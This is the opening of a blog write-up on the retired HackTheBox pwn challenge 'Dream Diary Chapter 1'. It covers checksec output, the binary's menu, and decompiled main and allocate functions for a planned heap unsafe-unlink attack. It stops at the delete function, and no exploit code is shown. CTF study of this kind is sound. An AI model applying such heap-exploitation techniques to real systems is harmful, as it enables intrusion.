@@ -1,0 +1,1761 @@
+<!DOCTYPE HTML>
+<html lang="en-EN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="HTB Pwn - Dream Diary Chapter: 1, D4mianWayne">
+    <meta name="description" content="I like to do reverse engineering">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-144686323-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-144686323-1');
+</script>
+
+
+    <title>HTB Pwn - Dream Diary Chapter: 1 | D4mianWayne&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">D4mianWayne&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>home</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle-o" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">D4mianWayne&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            I like to do reverse engineering
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			home
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle-o"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/D4mianWayne" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>My Github
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/D4mianWayne" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="My Github" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">HTB Pwn - Dream Diary Chapter: 1</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    .toc-fixed .toc-link::before{
+        position: fixed!important;/*当toc的位置改为fixed时，.toc-link::before也要改为fixed*/
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/unlink-htb-pwn-heap/">
+                                <span class="chip bg-color">unlink, htb, pwn, heap</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/HackTheBox/" class="post-category">
+                                HackTheBox
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2020-10-19
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    3.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    24 Min
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to it earlier but couldn’t get time for this writeup, so I will write it here.</p>
+<h1 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h1><p>Binary: <a href="https://github.com/D4mianWayne/PwnLand/blob/master/Heap/Unsafe%20Unlink/chapter1" target="_blank" rel="noopener">Get Here</a><br>Exploit: <a href="https://github.com/D4mianWayne/PwnLand/blob/master/Heap/Unsafe%20Unlink/chapter1.py" target="_blank" rel="noopener">Get Here</a></p>
+<h1 id="Initial-Analysis"><a href="#Initial-Analysis" class="headerlink" title="Initial Analysis"></a>Initial Analysis</h1><p>First of, all we will see the binary and the security mechanisms on the binary and see the workflow of it. Let’s identify the file:-</p>
+<pre class=" language-r"><code class="language-r"><span class="token number">0</span> <span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">38</span><span class="token punctuation">]</span> vagrant<span class="token operator">@</span>oracle<span class="token punctuation">(</span>oracle<span class="token punctuation">)</span> HackTheBox<span class="token operator">></span> file chapter1
+chapter1<span class="token operator">:</span> ELF <span class="token number">64</span><span class="token operator">-</span>bit LSB executable<span class="token punctuation">,</span> x86<span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span> version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span><span class="token punctuation">,</span> dynamically linked<span class="token punctuation">,</span> interpreter <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span>.so<span class="token number">.2</span><span class="token punctuation">,</span> <span class="token keyword">for</span> GNU<span class="token operator">/</span>Linux <span class="token number">2.6</span>.<span class="token number">32</span><span class="token punctuation">,</span> BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>5fd205b7bbec91799613399634a187d1ca71e1a3<span class="token punctuation">,</span> stripped</code></pre>
+<p>So, this is a 64 bit binary and on top of that it is stripped, which means reverse engineering it’ll take quite sometime, let’s check the security mechanisms:-</p>
+<pre class=" language-r"><code class="language-r"><span class="token number">0</span> <span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">41</span><span class="token punctuation">]</span> vagrant<span class="token operator">@</span>oracle<span class="token punctuation">(</span>oracle<span class="token punctuation">)</span> HackTheBox<span class="token operator">></span> checksec chapter1
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/media/sf_Pwning/HackTheBox/chapter1'</span>
+    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
+    RELRO<span class="token operator">:</span>    Partial RELRO
+    Stack<span class="token operator">:</span>    Canary found
+    NX<span class="token operator">:</span>       NX enabled
+    PIE<span class="token operator">:</span>      No PIE <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span></code></pre>
+<p><code>Canary</code> and <code>NX Enabled</code> means that overflow is not gonna happen easily considering <strong>iff</strong> any kind of overflow exists, and it has <code>Partial RELRO</code> which <code>Global Offset Table</code> would be in <code>r/w</code> section which means we can overwrite the GOT entries.</p>
+<p>All things, aside let’s run the binary:-</p>
+<pre class=" language-r"><code class="language-r"><span class="token number">2</span> <span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">12</span><span class="token operator">:</span><span class="token number">09</span><span class="token punctuation">]</span> vagrant<span class="token operator">@</span>oracle<span class="token punctuation">(</span>oracle<span class="token punctuation">)</span> HackTheBox<span class="token operator">></span> .<span class="token operator">/</span>chapter1 
+
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span>         Dream Diary          <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Allocate                 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Edit                     <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Delete                   <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> Exit                     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">></span><span class="token operator">></span> <span class="token number">1</span>
+
+Size<span class="token operator">:</span> <span class="token number">100</span>
+Data<span class="token operator">:</span> AAA
+Success<span class="token operator">!</span>
+
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span>         Dream Diary          <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Allocate                 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Edit                     <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Delete                   <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> Exit                     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">></span><span class="token operator">></span> <span class="token number">2</span>
+Index<span class="token operator">:</span> <span class="token number">0</span>
+Data<span class="token operator">:</span> AKSSKSK
+Done<span class="token operator">!</span>
+
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span>         Dream Diary          <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Allocate                 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Edit                     <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Delete                   <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> Exit                     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">></span><span class="token operator">></span> Invalid choice<span class="token operator">!</span>
+
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span>         Dream Diary          <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Allocate                 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Edit                     <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Delete                   <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> Exit                     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">></span><span class="token operator">></span> <span class="token number">3</span>
+Index<span class="token operator">:</span> <span class="token number">0</span></code></pre>
+<p>So, it seems like it allocates a specific amount of size in memory and then let us store the data at allocated region. On top of that it allow us to delete the allocated region and even edit an allocated chunk. Since we want to pwn it, we need to reverse engineer it, let’s go.</p>
+<h1 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h1><p>First off, we will load the binary in IDA and let it do the work, then we will analyze the functions. First, we will check the <code>main</code> function:-</p>
+<pre class=" language-C"><code class="language-C">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  int v3; // eax
+  __int64 buf; // [rsp+0h] [rbp-10h]
+  unsigned __int64 real_canary; // [rsp+8h] [rbp-8h]
+
+  real_canary = canary;
+  buf = 0LL;
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stderr, 0LL, 2, 0LL);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      print_menu();
+      read(0, &buf, 4uLL);
+      v3 = atoi((const char *)&buf);
+      if ( v3 != 2 )
+        break;
+      edit();
+    }
+    if ( v3 > 2 )
+    {
+      if ( v3 == 3 )
+      {
+        delete();
+      }
+      else
+      {
+        if ( v3 == 4 )
+          exit(0);
+LABEL_13:
+        puts("Invalid choice!");
+      }
+    }
+    else
+    {
+      if ( v3 != 1 )
+        goto LABEL_13;
+      allocate();
+    }
+  }
+}</code></pre>
+<p>Quite simple, it calls <code>print_menu</code> and then read the integer and depending on what option we choose, it calls the function, the only function which stands out for the interest here is <code>allocate</code>, <code>edit</code> and <code>delete</code> as this is the core functions of the binary, let’s check those out.</p>
+<blockquote>
+<p>NOTE: I have named the functions to more readable names, so it’ll help in understanding rest of the code.</p>
+</blockquote>
+<p>Let’s check the <code>allocate</code>:-</p>
+<pre class=" language-C"><code class="language-C">unsigned __int64 allocate()
+{
+  signed int i; // [rsp+4h] [rbp-1Ch]
+  size_t size; // [rsp+8h] [rbp-18h]
+  char nptr[8]; // [rsp+10h] [rbp-10h]
+  unsigned __int64 real_canary; // [rsp+18h] [rbp-8h]
+
+  real_canary = canary;
+  *(_QWORD *)nptr = 0LL;
+  for ( i = 0; ; ++i )
+  {
+    if ( i > 15 )
+    {
+      puts("Too many notes!");
+      return canary ^ real_canary;
+    }
+    if ( !ptr[i] )
+      break;
+  }
+  printf("\nSize: ");
+  read_string(nptr, 6uLL);
+  size = atoi(nptr);
+  ptr[i] = (char *)malloc(size);
+  if ( !ptr[i] )
+  {
+    puts("Malloc error!");
+    exit(-1);
+  }
+  printf("Data: ", 6LL);
+  read_string(ptr[i], size);
+  puts("Success!");
+  return canary ^ real_canary;
+}</code></pre>
+<p>So, first of it checks if the total number of allocated notes is not more than 15, if it is not then it reads the size and then it allocates a chunk of <code>size</code> given, with the index of the note stored in the gloabl variable named <code>ptr</code>. For example, if none of the note has been allocated and given size is <code>0x40</code>, the <code>allocate</code>function will do <code>malloc(0x40)</code> then it address of the allocated chunk will be stored at <code>ptr[0] = &amp;allocated_chunk</code>.</p>
+<p>Now, it doesn’t do much stuff which seems to be of interest, so let’s move on the <code>delete</code> function:-</p>
+<pre class=" language-C"><code class="language-C">unsigned __int64 delete()
+{
+  int v1; // [rsp+Ch] [rbp-14h]
+  __int64 buf; // [rsp+10h] [rbp-10h]
